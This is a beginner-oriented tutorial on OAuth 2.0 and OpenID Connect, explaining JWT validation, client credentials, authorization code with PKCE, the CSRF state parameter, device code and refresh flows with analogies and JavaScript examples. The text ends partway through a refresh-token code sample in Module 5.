# OAuth 2.0 + OpenID Connect — The Complete Mastery Guide

> **Who this is for:** You are a software developer. You are smart. You have never worked with OAuth or OIDC before. By the end of this guide you will understand these protocols deeply enough to architect, implement, debug, and *explain them to your entire team.*

---

## 🎬 Day in the life — you already use this every day

Before reading a single technical line, consider your last working day:

```
08:30  You open Spotify Web Player. Click "Log in with Google."
       Google's page appears. You log in there.
       You land back on Spotify, logged in.
       → That was Authorization Code + PKCE. Module 4.

10:15  Your CI/CD pipeline pushes a build.
       It calls the deployment API. Gets rejected: 401 Unauthorized.
       Someone has to fix it. Maybe you.
       → That was a Client Credentials token that expired. Module 3.

13:00  You add "Sign in with GitHub" to your side project.
       GitHub redirects users to their own login page. It just works.
       → That was OpenID Connect. Module 6.

16:30  You open your company's Salesforce without typing a password.
       You're already logged in — you never set up a Salesforce password.
       → That was SAML SSO (separate guide) using OIDC concepts underneath.

17:45  A user emails support: "I logged out but I'm still signed in."
       You stare at the code. It calls logout(). What is going on?
       → That was the JWT logout problem. Module 7.
```

Every one of these happened to you. This guide will finally explain what was going on.

---

## 🧭 Developer orientation

### What this guide gives you

```
Situation you will face                    Module to read
────────────────────────────────────────────────────────────────────
"Why can't the app just store my password?"          → Module 1
"How does the API know this token is real?"          → Module 2
Building a service that calls another service        → Module 3
Building login for a web or mobile app               → Module 4
Smart TV / CLI / IoT needs authentication            → Module 5
"Sign in with Google" — building or understanding    → Module 6
Token storage, security, production hardening        → Module 7
Architecture patterns — 2-legged, 3-legged, relay   → Module 8
```

### The master analogy — the VIP event wristband system

Every concept in this guide maps to this one analogy. Refer back whenever something feels abstract.

```
THE VIP EVENT                                  OAUTH 2.0
─────────────────────────────────────────────────────────────────────
You — the VIP guest                       =    Resource Owner
Your personal assistant                    =    Client (the app)
The event box office / organiser           =    Authorization Server
The bar, backstage, VIP lounge             =    Resource Server (the API)
The wristband                              =    Access Token
Your VIP membership card                   =    Refresh Token
What the wristband lets you access         =    Scope
The wristband's expiry stamp               =    exp claim
Which event it's valid for                 =    aud (audience) claim
Who stamped it                             =    iss (issuer) claim

2-Legged OAuth:
  Your assistant walks up to box office alone.
  Gets a wristband for the service entrance. No VIP involved.

3-Legged OAuth:
  YOU go to box office, approve what your assistant can access,
  they issue the wristband. You are involved in the decision.
```

### The critical mental shift — tokens are not sessions

If you have built web apps before, you know sessions. This is the most important conceptual bridge in the guide.

```
SESSION (what you already know)              TOKEN / JWT (what you are learning)
──────────────────────────────────────       ──────────────────────────────────────
Server stores session data in a DB           Server stores NOTHING
Browser has a reference cookie ID            Client has the actual data (the token)
Server looks up session on every request     Server validates token locally — no lookup
Revoke: delete the session row               Revoke: wait for expiry OR use blocklist
Scale: session DB becomes a bottleneck       Scale: any server validates independently
                                             because the public key is all it needs

ANALOGY:
  Session  = Library membership number        Token = Driving licence
             "Show your number, I will                "Show your licence —
              look you up in my database"              I verify it myself
                                                       without calling anyone"
```

> **⚠️ Common mistake #1:** Treating tokens like sessions — calling the Auth Server on every request to "verify" them. If you have a valid JWT and the public key, you verify it *locally*. That is the entire point. Calling the Auth Server every time defeats the purpose of JWTs entirely.

### 🔖 Symbol guide

| Symbol | Meaning |
|:---:|---|
| 💡 | Core concept |
| 🔐 | Security critical |
| 🏭 | Production pattern |
| ⚠️ | Common mistake |
| 📖 | Real-world story |
| 🕵️ | Detective mode — debugging |
| 💬 | Mentor aside |
| 🧩 | Connect the dots |
| 🎓 | Interview-ready |
| ⚡ | Speed run |
| 🤔 | What would you do? |

---

## Module 1 — Why OAuth 2.0 exists {#module-1}

### 🎯 The one question that unlocks this module

> **"Why should an app NOT just ask for your password?"**
> Answer this and everything else in Module 1 follows naturally.

### 💡 Plain English

> OAuth 2.0 in one sentence: It is the system that lets you say *"yes, that app can access my data — but only THIS much, and only for THIS long — without me ever giving the app my password."*

### 📖 The story — 2009, and why everything was broken

It is 2009. A new app called TripAdvisor wants to email your restaurant reviews to your friends. To access your Gmail contacts it shows a form:

**"Enter your Gmail username and password."**

You type it in. Now think carefully about what just happened:

```
What TripAdvisor now has:
  ✗ Your Gmail password — stored in their database
  ✗ Access to every email you have ever sent or received
  ✗ The ability to send emails AS you, to anyone
  ✗ Permanent access — they can never "un-know" your password

What happens three months later when TripAdvisor is hacked:
  ✗ Attackers have your Gmail password
  ✗ Your bank sends password resets to Gmail
  ✗ Your work email goes through Gmail
  ✗ One breach cascades into everything you own
```

**This is the exact problem OAuth 2.0 was invented to solve.**

With OAuth, the same scenario becomes:

```
What happens instead:
  ✓ TripAdvisor redirects you to Google's own login page
  ✓ You log in at Google — TripAdvisor never sees your password
  ✓ Google asks: "TripAdvisor wants to read your contacts. Allow?"
  ✓ You click Allow
  ✓ Google gives TripAdvisor a LIMITED token:
      - read contacts only
      - expires in 1 hour
      - for TripAdvisor only
  ✓ If TripAdvisor is hacked: attackers get a token that expires soon
  ✓ You revoke TripAdvisor's access from Google settings any time
  ✓ Your password is never involved
```

### 💡 The four actors

```
┌──────────────────────────────────────────────────────────────────────┐
│  👤 RESOURCE OWNER — You                                             │
│     You own the data. You grant permission. You can revoke it.      │
│     In some flows (Client Credentials) the app itself is the owner. │
├──────────────────────────────────────────────────────────────────────┤
│  📱 CLIENT — The application                                          │
│     Wants access to your data. Acts on your behalf.                 │
│     Never sees your password. Examples: TripAdvisor, GitHub CLI,    │
│     your company's mobile app, a microservice.                      │
├──────────────────────────────────────────────────────────────────────┤
│  🔐 AUTHORIZATION SERVER — The trusted authority                      │
│     Verifies your identity. Issues tokens. The referee.             │
│     Examples: Google, PingFederate, Okta, Auth0, Azure AD.         │
├──────────────────────────────────────────────────────────────────────┤
│  🌐 RESOURCE SERVER — The API                                         │
│     Holds your protected data. Validates tokens. Serves data.       │
│     Examples: Google Contacts API, GitHub API, your backend API.    │
└──────────────────────────────────────────────────────────────────────┘
```

### 💡 OAuth is authorisation — NOT authentication

```
AUTHENTICATION:    "Prove who you are"               → Login / Identity
AUTHORISATION:     "Prove what you are allowed to do" → Permissions / Access

OAuth 2.0 ONLY handles authorisation.
It does NOT tell you who the user is.
That is what OpenID Connect (Module 6) adds on top.

Real consequence:
  If you implement OAuth alone (no OIDC) and try to use it for login,
  you get a token that proves the app has permission to do something —
  but you cannot reliably identify which human is behind it.
  Many early OAuth implementations got this wrong. Yours won't.
```

### ⚠️ Common misconceptions — Module 1

```
❌ "OAuth is a login system"
✅ OAuth is an access delegation framework. OIDC (Module 6) adds login.

❌ "OAuth keeps your data safe by encrypting it"
✅ OAuth limits access via scoped tokens. It says nothing about encryption.

❌ "Once I have an OAuth token, the user is authenticated"
✅ A token proves the app has permission. It doesn't reliably tell you
   who the human is. Use the OIDC ID token for that (Module 6).
```

### 🤔 What would you do?

```
Scenario: Your team is building a fitness app. It wants to read users'
Google Calendar to find free slots for workout reminders.

Questions to think through:
  • Which OAuth actor is Google Calendar?
  • Which actor is your fitness app?
  • Who is the Resource Owner?
  • What scope would you request?
  • What happens if the user uninstalls the app — does access stop?

Think it through... then read:
  Google Calendar = Resource Server (holds the calendar data)
  Your fitness app = Client (wants to read the data)
  The user = Resource Owner (owns the calendar, grants permission)
  Scope = "https://www.googleapis.com/auth/calendar.readonly"
  Revocation: access does NOT automatically stop on uninstall.
  The token remains valid until expiry. You must call the revocation
  endpoint (Module 7) on logout/uninstall to terminate access cleanly.
```

### ⚡ Speed run — Module 1

```
⚡ OAuth solves: apps acting on your behalf WITHOUT your password
⚡ Four actors: Resource Owner · Client · Auth Server · Resource Server
⚡ OAuth = authorisation (what an app can do). NOT authentication (who you are).
⚡ Tokens are scoped (limited), time-bounded (expiry), and revocable
⚡ OIDC (Module 6) is what adds "who is the user" on top of OAuth
```

---

## Module 2 — JWT: the token format that powers everything {#module-2}

### 🎯 The one question that unlocks this module

> **"If the API never calls the Auth Server, how does it know the token is genuine?"**
> The answer to this is JWTs, public key cryptography, and JWKS — and it is beautiful.

### 💡 Plain English

> JWT in one sentence: A tamper-proof, self-contained information card — like a digitally signed driving licence that any API can verify without phoning anyone.

### 🛠️ Start here — see it before you learn it

Paste this token into **jwt.io** right now:

```
eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleS0xIn0.eyJpc3MiOiJodHRwczovL2F1dGguZXhhbXBsZS5jb20iLCJzdWIiOiJ1c2VyXzEyMyIsImF1ZCI6Imh0dHBzOi8vYXBpLmV4YW1wbGUuY29tIiwiZXhwIjoxNzEzNDU2Nzg5LCJpYXQiOjE3MTM0NTMxODksInNjb3BlIjoiYXBpLnJlYWQiLCJlbWFpbCI6ImphbmVAZXhhbXBsZS5jb20ifQ.SIGNATURE_HERE
```

You will see three decoded sections. The middle section (the payload) shows:
- **Who issued this token** (`iss`)
- **Who this token is about** (`sub`)
- **Who this token is intended for** (`aud`)
- **When it expires** (`exp` — a Unix timestamp, convert at unixtimestamp.com)
- **What permissions it carries** (`scope`)
- **Custom user data** (`email`)

The API reads exactly this. No database. No network call. Just: decode, verify, check claims.

### 💡 The three segments

```
eyJhbGciOiJSUzI1NiIsImtpZCI6ImtleS0xIn0          ← HEADER
.
eyJpc3MiOiJodHRwczovL2F1dGguZXhhbXBsZS5jb20...    ← PAYLOAD
.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c        ← SIGNATURE

Each part is Base64url encoded — NOT encrypted.
Anyone who intercepts a JWT can decode and read it.
The signature only proves it was not tampered with.

THE ID BADGE ANALOGY:
  Header    = Badge format ("this is an RSA-signed badge, key ID: key-1")
  Payload   = Information on the badge (name, access level, expiry date)
  Signature = The holographic seal that proves it is genuine

  The badge is readable by anyone who sees it.
  Forging the holographic seal? Computationally impossible.
```

> **🔐 Never put passwords, API keys, or sensitive secrets in a JWT payload. It is readable by anyone.**

### 💡 Standard claims — every field explained

```json
{
  "iss": "https://auth.example.com",   // ISSUER: who created this token
  "sub": "user_123",                   // SUBJECT: who this token is about
  "aud": "https://api.example.com",    // AUDIENCE: who this token is FOR
  "exp": 1713456789,                   // EXPIRY: reject after this Unix timestamp
  "iat": 1713453189,                   // ISSUED AT: when it was created
  "jti": "a8f3c2d1-4b5e-6f7a-8b9c",  // JWT ID: unique — used for replay prevention
  "scope": "api.read profile",         // SCOPE: what permissions this grants
  "email": "jane@example.com",         // CUSTOM: added by your Auth Server
  "roles": ["admin", "user"]           // CUSTOM: added by your Auth Server
}
```

| Claim | Who must validate it | What breaks if you skip it |
|---|---|---|
| `iss` | Resource Server (API) | Dev environment tokens work in production |
| `sub` | Your app | You use the wrong user's identity |
| `aud` | Resource Server (API) | Token for API-A works at API-B |
| `exp` | Resource Server (API) | Expired tokens work forever |
| `scope` | Resource Server (API) | Insufficient permissions go unchecked |

### 💡 How the signature works — public key cryptography

```
THE ASYMMETRIC KEY PAIR:
  Auth Server has: PRIVATE key (kept secret — only it can SIGN)
  Everyone has:    PUBLIC key (published at JWKS endpoint — anyone can VERIFY)

  This means: Anyone can check a JWT is genuine.
              Nobody except the Auth Server can CREATE a genuine JWT.

HOW VERIFICATION WORKS:
  1. Auth Server signs JWT with private key → issues to client
  2. Auth Server publishes public key at /pf/JWKS (or /.well-known/jwks.json)
  3. Client sends JWT to Resource Server in Authorization header
  4. Resource Server fetches public key from JWKS (ONCE, then caches for hours)
  5. Resource Server runs: verify(jwt, publicKey) → true or false
  6. No Auth Server call needed. Every request verified locally in < 1ms.

WHY RS256 NOT HS256:
  HS256 uses ONE shared secret for both signing and verification.
  If the API knows the secret, it could also FORGE tokens.
  RS256/ES256 separates signing (private) from verification (public).
  The API can only verify — never forge. This is the right model.
```

### 🔭 Behind the scenes — what actually happens in milliseconds

Open Chrome DevTools → Network tab → log in to any Google service. Here is what you are actually watching:

```
[0ms]    Browser: GET /authorize?response_type=code&...
         Status: 302 → redirected to login page

[20ms]   Browser: GET /login?session=abc123
         Status: 200 (HTML login form rendered in browser)

         ← USER TYPES PASSWORD (~5 seconds) →

[5020ms] Browser: POST /login (username + password)
         Status: 302 → redirect back to your app
         Location: https://yourapp.com/callback?code=SplxlO&state=xyz

[5035ms] Browser: GET /callback?code=SplxlO&state=xyz
         Status: 200 (your app's callback handler runs)

[5036ms] YOUR SERVER (never visible in browser Network tab):
         POST /token
         Body: code=SplxlO&code_verifier=dBjft...
         Status: 200
         Body: { "access_token": "eyJhbG...", "expires_in": 3600 }

[5037ms] Your app creates session cookie → user appears logged in

Total time: ~5 seconds (mostly waiting for the user to type)
Browser sees: 4 requests
Server makes: 1 additional back-channel request invisible to the browser
```

> 💬 *"Notice the back-channel token exchange is invisible in DevTools. This is intentional — the access_token never appears in a URL, never in browser history, never in a server log. This is the entire point of the auth code + back-channel pattern."*

### 💡 JWT vs Opaque tokens

| | JWT | Opaque token |
|---|---|---|
| What it looks like | Three Base64 segments with dots | Short random string |
| Validation | Local (~0ms, no network call) | Call Auth Server `/introspect` (+50-100ms) |
| Contents visible | Yes — readable by anyone | No — only Auth Server knows |
| Revocation | Cannot revoke before expiry | Revocable instantly |
| Use when | High-traffic APIs, speed matters | Strict revocation required |

### 💡 Token Introspection — RFC 7662

When you use opaque tokens or need real-time revocation checking:

```bash
POST https://auth.example.com/introspect
Authorization: Basic base64(client_id:client_secret)
Content-Type: application/x-www-form-urlencoded

token=<the_token>

# Active token response:
{ "active": true, "sub": "user_123", "scope": "api.read", "exp": 1713456789 }

# Invalid / expired / revoked response:
{ "active": false }
```

### 💡 Token Revocation — RFC 7009

```bash
# On logout: revoke the refresh token first
POST https://auth.example.com/oauth/revoke
Authorization: Basic base64(client_id:client_secret)

token=<refresh_token>&token_type_hint=refresh_token
# Response: 200 OK (even if token was already invalid)
```

> **🏭 Always revoke the refresh token on logout, not just the access token.** Access tokens expire in minutes. A refresh token can generate new access tokens for days or months. The refresh token is the real risk.

### 🕵️ Detective mode — solving JWT errors

```
THE CASE: Your API returned 401. The user swears they just logged in.

CLUE 1: Decode the token at jwt.io
  → Check exp field. Convert Unix timestamp at unixtimestamp.com.
  → Is it in the past? VERDICT: Token expired.
  → Still valid? Continue investigation.

CLUE 2: Check the aud claim
  → Does it match YOUR API's URL exactly?
  → Common find: "aud": "https://api.dev.example.com" but you're in production.
  → VERDICT: Wrong environment token used.

CLUE 3: Check the iss claim
  → Does it match your Auth Server URL exactly?
  → Common find: trailing slash difference, http vs https.
  → VERDICT: Issuer mismatch in your validation config.

CLUE 4: Check the scope claim
  → Does it contain the scope YOUR endpoint requires?
  → Common find: token has "api.read" but endpoint requires "api.write".
  → VERDICT: Insufficient scope.

CLUE 5: Algorithm mismatch
  → Header shows "alg": "RS256" but your code only allows "HS256"
  → VERDICT: Fix your algorithm allowlist.

Tools: jwt.io (decode any JWT), unixtimestamp.com (convert exp/iat),
       curl -v (see raw headers), your Auth Server's admin console.
```

### 🎓 Interview-ready — Module 2

```
❓ "What is the difference between signing and encrypting a JWT?"
⭐ Answer that impresses:
   "Signing proves integrity — anyone can read the payload but nobody can
   tamper with it without breaking the signature. Encrypting provides
   confidentiality — the payload is unreadable without the decryption key.
   Most JWTs use signing (JWS), not encryption (JWE). For API authorisation,
   signing is standard — the claims are not secret, they just need to be
   tamper-proof. If your JWT contains sensitive PII, you would use JWE on top."

❓ "Why can't you revoke a JWT before it expires?"
⭐ Answer that impresses:
   "Because JWTs are validated locally without calling the Auth Server.
   There is nothing to 'revoke' — any server with the public key will accept
   a valid JWT. Solutions: keep expiry short (15-60 min), use a token blocklist
   in Redis (check JTI claim), or switch to opaque tokens with introspection
   for operations that require immediate revocation."
```

### ⚠️ Common misconceptions — Module 2

```
❌ "JWTs are encrypted and secure — I can put anything in them"
✅ JWTs are Base64url ENCODED — readable by anyone. Never put secrets inside.

❌ "If the signature is valid, the token is valid"
✅ Valid signature + exp not past + iss correct + aud correct = valid.
   A perfect signature on an expired token is still an invalid token.

❌ "I should call the Auth Server to validate every JWT"
✅ Validate locally with the public key from JWKS. That is the point.
   Exception: opaque tokens require introspection. JWTs do not.

❌ "alg:none is blocked by default in JWT libraries"
✅ Many older libraries accepted alg:none unless explicitly blocked.
   Always set an explicit algorithm allowlist. Never trust defaults alone.
```

### ⚡ Speed run — Module 2

```
⚡ JWTs are readable by anyone — never put secrets in the payload
⚡ Three parts: header (how signed) · payload (the claims) · signature (the proof)
⚡ Validate: signature + exp + iss + aud + scope — skipping any = vulnerability
⚡ RS256/ES256 = asymmetric (private to sign, public to verify) — use these
⚡ JWT validation is local and instant — no Auth Server call needed per request
```

---

## Module 3 — Client Credentials grant (2-legged OAuth) {#module-3}

### 🎯 The one question that unlocks this module

> **"What if there is no user at all — just two machines talking?"**
> When there is no human, there is no consent screen, no login, no 3-legged dance. The app is the user. That is Client Credentials.

### 💡 Plain English

> Client Credentials in one sentence: The application itself logs in — *"here is my ID and password, give me a token"* — no human involved, no consent screen, no redirect.

### 💡 2-legged vs 3-legged — the fundamental split

```
2-LEGGED (Client Credentials):
  Parties: Client + Auth Server (2 parties)
  User: NONE
  The app IS the resource owner
  Gets: access_token only (no refresh_token — app can just request a new one)
  Use: machine-to-machine, background jobs, services

        [Client] ──── POST /token (client_id + client_secret) ────► [Auth Server]
        [Client] ◄─── access_token ───────────────────────────────── [Auth Server]
        [Client] ──── Bearer token ────────────────────────────────► [Resource Server]

3-LEGGED (Authorization Code, Device Code):
  Parties: Resource Owner + Client + Auth Server (3 parties)
  User: YES — a real human who grants consent
  The user owns the data, the app acts on their behalf
  Gets: access_token + refresh_token + id_token (with OIDC)
  Use: user-facing apps, anything requiring human approval
```

### 💡 When to use Client Credentials

```
✅ USE for:                               ❌ DO NOT use for:
  Microservice A calls Microservice B       Anything involving a human user
  Nightly batch job reads from an API       Per-user data access
  CI/CD pipeline calls deployment API       When you need to know WHO the user is
  IoT sensor uploads telemetry             When you need a refresh token
  Background sync / ETL process
```

### 💡 The minimal working example — Day 1 code

```javascript
// MINIMAL — this is all you need to make it work
async function callApi() {
  // Step 1: Get a token (10 lines)
  const tokenRes = await fetch('https://auth.example.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'grant_type=client_credentials'
        + '&client_id=MY_CLIENT_ID'
        + '&client_secret=MY_CLIENT_SECRET'
        + '&scope=api.read'
  });
  const { access_token } = await tokenRes.json();

  // Step 2: Use the token (3 lines)
  const res = await fetch('https://api.example.com/data', {
    headers: { 'Authorization': `Bearer ${access_token}` }
  });
  return res.json();
}
```

That is the complete flow. Everything below is production hardening.

### 🏭 Production version — with token caching

```javascript
// PRODUCTION — never request a new token on every API call
let _token = null;
let _expiry = 0;

async function getToken() {
  const now = Math.floor(Date.now() / 1000);

  // Reuse if more than 5 minutes remain
  if (_token && now < _expiry - 300) return _token;

  const res = await fetch('https://auth.example.com/token', {
    method: 'POST',
    headers: {
      // Using Basic Auth header (more secure than body params)
      'Authorization': 'Basic ' + Buffer.from(
        `${process.env.CLIENT_ID}:${process.env.CLIENT_SECRET}`
      ).toString('base64'),
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: 'grant_type=client_credentials&scope=api.read'
  });

  const data = await res.json();
  _token  = data.access_token;
  _expiry = now + data.expires_in;
  return _token;
}

// Usage: await getToken() before every API call
// It handles caching automatically — only hits the token endpoint when needed
```

> 💬 *"Token endpoints have rate limits. Requesting a new token on every API call will get you throttled or banned. Cache and reuse — always. The 5-minute buffer before expiry ensures you never use an expired token under normal clock conditions."*

### 📖 Real-world: payment microservices at a bank

```
A retail bank's payment platform. Four services. Each is its own identity.

  Order Service     client_id: order-svc    scope: payment.initiate
  Payment Service   client_id: payment-svc  scope: fraud.check
  Fraud Service     client_id: fraud-svc    scope: notify.send
  Notification Svc  client_id: notify-svc   (receives only)

Processing a £500 wire transfer:
  1. Order Service  → gets its token → calls Payment Service
  2. Payment Service → gets its OWN token → calls Fraud Service
  3. Fraud Service approves → calls Notification Service

Security benefit:
  If Payment Service is compromised, attacker gets a token scoped to
  fraud.check ONLY. They cannot initiate payments (wrong scope).
  They cannot impersonate Order Service (wrong client_id).
  Principle of least privilege — enforced automatically via OAuth scopes.
```

### 🤔 What would you do?

```
Scenario: You have a nightly job that generates PDF reports and emails them.
It needs to: read user data from the User API, read reports from the Report API,
and call the Email API to send. All three APIs require OAuth tokens.

Should you:
  A) Get one token with all three scopes?
  B) Get three separate tokens — one per API?
  C) Get one token and reuse it for all three calls?

Think about it... then read:

  A is simpler to implement but violates least privilege.
  A compromised token gives access to all three services.

  B is the correct approach for strict security.
  If Email API token is leaked, only the email service is exposed.
  Each token is scoped to exactly what that service needs.

  C depends on whether one token can carry all three scopes.
  If the Auth Server supports it and all three APIs trust the same issuer,
  one token with three scopes is acceptable for low-risk internal services.

  Real answer: start with C for simplicity, move to B if any service handles
  sensitive data or has stricter compliance requirements.
```

### ⚡ Speed run — Module 3

```
⚡ Client Credentials = 2-legged OAuth — app authenticates as itself, no user
⚡ Use for: service-to-service, batch jobs, CI/CD, IoT — any machine-only context
⚡ Cache the token — never request a new one on every API call
⚡ Refresh tokens are NOT issued — app just requests a new token when needed
⚡ Secret management: environment variables in dev, Vault/AWS Secrets Manager in prod
```

---

## Module 4 — Authorization Code + PKCE (3-legged OAuth) {#module-4}

### 🎯 The one question that unlocks this module

> **"Why is there a code in the middle? Why not just return the token in the redirect?"**
> Because tokens in URLs end up in browser history, server logs, and Referrer headers. The code in the middle is deliberately useless on its own. Only the server — which also has the client_secret or PKCE verifier — can exchange it for the real token. That split between front-channel and back-channel is the security architecture.

### 💡 Plain English

> Authorization Code flow in one sentence: The user logs in at the Auth Server directly, approves what the app can access, and the app gets a token — the user's password never touches the app.

### 💡 Front-channel vs Back-channel — the architecture that makes this safe

```
FRONT CHANNEL (through the browser — visible):
  What travels here:   auth_code, state, error messages
  What NEVER goes here: access_token, refresh_token, client_secret
  Why: URLs appear in browser history, server access logs, Referrer headers
  Security: anything in a URL is potentially logged somewhere

BACK CHANNEL (direct server-to-server HTTPS — invisible to browser):
  What travels here:   everything sensitive — tokens, secrets, assertions
  Why it is safe:      browser cannot intercept, cannot log, cannot see
  Result:              the access_token never appears in any URL ever

THE GENIUS OF THE AUTH CODE:
  auth_code alone = useless (like a ticket stub with no ticket)
  auth_code + client_secret = gets you the token
  auth_code + PKCE verifier = gets you the token (for public clients)

  So the front channel carries something useless.
  The back channel does the real work.
```

### 💡 Why PKCE exists — and why it is now mandatory

```
THE PROBLEM (without PKCE):
  Mobile apps and SPAs cannot safely store a client_secret.
  Anyone can decompile an APK or inspect a React bundle and extract it.
  A "secret" that 10 million devices know is not a secret.

THE PKCE SOLUTION:
  Instead of a static secret, generate a one-time cryptographic proof.

  BEFORE the redirect:
    Generate a random "code_verifier" (64 random bytes)
    Compute "code_challenge" = SHA256(code_verifier)
    Send code_challenge in the authorization request
    Keep code_verifier secret — never send it in a URL

  WHEN exchanging the auth_code:
    Send code_verifier in the token request
    Auth Server checks: SHA256(verifier) == challenge?
    If yes → issue token. If no → reject.

  THE ATTACK PKCE PREVENTS:
    Malicious app intercepts the auth_code from the redirect URI
    Tries to exchange the code → must also provide the verifier
    It never had the verifier → SHA256 check fails → rejected ✓
```

### 💡 The complete flow — step by step

```mermaid
sequenceDiagram
    participant U as 👤 User
    participant B as 🌐 Browser
    participant App as 📱 Your App (server)
    participant AS as 🔐 Auth Server

    Note over App: Generate PKCE pair + state
    App->>App: verifier=random_64_bytes()
    App->>App: challenge=SHA256(verifier)
    App->>App: state=random_uuid()
    App->>B: Store verifier+state in sessionStorage
    B->>AS: GET /authorize?response_type=code<br/>&code_challenge=SHA256(verifier)<br/>&state=xyz&scope=openid+profile+api.read
    AS->>U: Show login + consent page
    U->>AS: Log in, approve permissions
    AS->>B: 302 /callback?code=AUTH_CODE&state=xyz
    B->>App: code+state arrive at callback
    App->>App: state matches stored value? ✓ (CSRF check)
    App->>AS: POST /token [BACK CHANNEL — server only]<br/>code + code_verifier + client_id
    AS->>AS: SHA256(verifier)==challenge? ✓
    AS->>App: access_token + id_token + refresh_token
    Note over App: access_token → memory<br/>id_token → read user info<br/>refresh_token → httpOnly cookie
```

### 💡 The state parameter — preventing CSRF

```
WITHOUT state:
  Attacker initiates an auth flow → gets a partially-completed login URL
  Tricks your browser into visiting it (via img tag, iframe, etc.)
  Your browser completes the login and binds IT to the ATTACKER's session
  Whatever you do next (enter card details, change email) happens in their account

WITH state:
  Your app generates a random UUID before the redirect
  Stores it in sessionStorage
  Includes it in the authorization request
  On callback: checks returned state == stored state
  Attacker's flow has a different state → your app rejects it ✓
```

### 💡 PKCE implementation — what you actually write

```javascript
// Generate PKCE pair (browser-side)
async function generatePKCE() {
  const array = new Uint8Array(64);
  crypto.getRandomValues(array);
  const verifier = btoa(String.fromCharCode(...array))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');

  const digest = await crypto.subtle.digest(
    'SHA-256',
    new TextEncoder().encode(verifier)
  );
  const challenge = btoa(String.fromCharCode(...new Uint8Array(digest)))
    .replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');

  return { verifier, challenge };
}

async function startLogin() {
  const { verifier, challenge } = await generatePKCE();
  const state = crypto.randomUUID();

  // Store for callback verification
  sessionStorage.setItem('pkce_verifier', verifier);
  sessionStorage.setItem('oauth_state', state);

  window.location.href =
    `https://auth.example.com/authorize`
    + `?response_type=code`
    + `&client_id=${CLIENT_ID}`
    + `&redirect_uri=${encodeURIComponent('https://yourapp.com/callback')}`
    + `&scope=openid+profile+api.read`
    + `&code_challenge=${challenge}`
    + `&code_challenge_method=S256`
    + `&state=${state}`;
}

// In your callback handler
function handleCallback() {
  const params = new URLSearchParams(window.location.search);

  // CRITICAL: verify state to prevent CSRF
  if (params.get('state') !== sessionStorage.getItem('oauth_state')) {
    throw new Error('State mismatch — possible CSRF attack. Aborting.');
  }

  const code     = params.get('code');
  const verifier = sessionStorage.getItem('pkce_verifier');

  // Clean up — these are single-use
  sessionStorage.removeItem('pkce_verifier');
  sessionStorage.removeItem('oauth_state');

  return exchangeCodeForTokens(code, verifier);
}
```

### 📖 Real-world: employee HR portal login

```
Monday morning. Jane opens hr.company.com. She has never visited it before.
There is no "create account" page. No login form. Just a button:
"Sign in with your company account →"

What happens in the next 3 seconds:

  1. HR portal generates PKCE pair and state, redirects Jane to PingFederate
     URL: https://pingfed.company.com/authorize?code_challenge=...

  2. PingFed shows the company login page Jane recognises from her daily Windows login
     Jane types her AD password — the HR portal NEVER sees it

  3. PingFed authenticates Jane against Active Directory
     Checks: account active? ✓ Password correct? ✓ In allowed groups? ✓

  4. PingFed redirects back to HR portal:
     https://hr.company.com/callback?code=SplxlO...&state=xyz

  5. HR portal server exchanges code (back-channel):
     Gets: access_token + id_token (roles=["manager","employee"])

  6. HR portal creates a session cookie for Jane
     Jane is now in the portal — sees her team's holiday balances and her pay slip

Jane's experience:
  She typed her Windows password ONCE, on a page she recognises.
  She never created a separate HR portal password.
  She never will. This is SSO.
```

### 🧩 Connect the dots

> 🧩 **PKCE and stateless thinking:** Remember the stateless vs stateful section in Module 1? PKCE uses the same principle. The code_verifier never touches the server. It lives only in sessionStorage, is used once, then deleted. No server-side state needed. This is why PKCE works perfectly for mobile apps with no server — the proof is generated and verified in a single round trip with no shared state stored anywhere.

### 🎓 Interview-ready — Module 4

```
❓ "Why can't a mobile app use a client_secret?"
⭐ Answer that impresses:
   "Because you cannot safely store a secret in a mobile app.
   Anyone can decompile the APK or IPA and extract hardcoded strings.
   A secret that 10 million devices know is not a secret — it is a public value.
   PKCE solves this by replacing the static secret with a per-request
   cryptographic proof. The code_verifier is generated fresh each time,
   never stored persistently, and never transmitted in the clear.
   There is nothing to steal."

❓ "What does PKCE stand for and what does it actually prevent?"
⭐ Answer that impresses:
   "Proof Key for Code Exchange. It prevents the auth code interception attack —
   where a malicious app on the same device intercepts the auth code from the
   redirect URI. Without PKCE, the malicious app could exchange the stolen code
   for a token. With PKCE, the exchange requires the code_verifier that was
   never transmitted over the front channel, so the attacker cannot proceed."
```

### ⚡ Speed run — Module 4

```
⚡ Auth code in URL = safe because it is useless without the verifier/secret
⚡ Token exchange happens server-to-server (back-channel) — never in the browser
⚡ PKCE: verifier stays secret locally, only SHA256(verifier) is sent to Auth Server
⚡ state parameter prevents CSRF — always generate, store, and verify it
⚡ OAuth 2.1 mandates PKCE for ALL Authorization Code flows — no exceptions
```

---

## Module 5 — Other grant types {#module-5}

### 💡 Device Code — for smart TVs, CLIs, IoT

```
🎯 One question: "What if the device can't open a browser?"
Answer: Show the user a short code and a URL. They approve on their phone.
        The device polls until approved. No browser needed on the device.
```

```
Flow:
  TV     → Auth Server: "Give me a device code" (client_id + scope)
  Auth Server → TV: {
    device_code: "GmRhmh...",
    user_code: "BDPF-YTVQ",
    verification_uri: "https://auth.example.com/device",
    interval: 5  // poll every 5 seconds
  }

  TV displays on screen:
    "Visit: auth.example.com/device"
    "Enter code: BDPF-YTVQ"

  User opens phone → visits URL → enters BDPF-YTVQ → approves

  TV polls every 5s:
    POST /token (device_code)
    ← "authorization_pending" (user hasn't approved yet)
    ← "authorization_pending"
    ← { access_token: "eyJhbG..." } (once user approves) ✓
```

> 📖 **You have done this:** Signing into YouTube on a smart TV. Authenticating the AWS CLI with `aws configure sso`. Running `gh auth login` in GitHub CLI. Connecting Spotify on a game console.

### 💡 Refresh Token — silent renewal

```javascript
async function apiCallWithAutoRefresh(endpoint) {
  let token = getStoredToken();

  // Proactive refresh: renew 60 seconds before expiry
  if (tokenExpiresInLessThan(token, 60)) {
    token = await silentRefresh();
  }

  const res = await fetch(endpoint, {
    headers: { Authorization: `Bearer ${token}` }
  });

  // Reactive refresh: handle unexpected expiry
  if (res.status === 401) {
    token = await silentRefresh();
    if (!token) { redirectToLogin(); return; }
